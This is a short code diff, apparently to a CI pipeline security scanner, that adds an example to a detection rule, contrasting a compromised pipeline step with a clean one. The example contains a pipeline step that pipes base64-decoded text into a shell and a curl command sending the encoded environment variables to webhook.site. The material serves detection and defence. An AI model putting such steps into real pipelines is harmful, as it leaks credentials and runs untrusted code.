@@ -37,6 +37,26 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "# Vulnerable: a step body executes a base64-decoded\n"
+        "# payload, exfils to ``webhook.site``, or runs a\n"
+        "# known miner binary. A malicious PR (or compromised\n"
+        "# co-maintainer) lands the payload in the pipeline file\n"
+        "# itself; every subsequent run executes it.\n"
+        "steps:\n"
+        "  - bash: |\n"
+        "      echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "      curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the pipeline does only what the pipeline does.\n"
+        "# No obfuscated execution, no exfil POSTs, no\n"
+        "# ``base64 -d | sh`` pipelines. If a check fires here\n"
+        "# it's either a compromise or a CTF fixture; treat as\n"
+        "# incident response.\n"
+        "steps:\n"
+        "  - checkout: self\n"
+        "  - bash: make build"
+    ),
 )
 
 
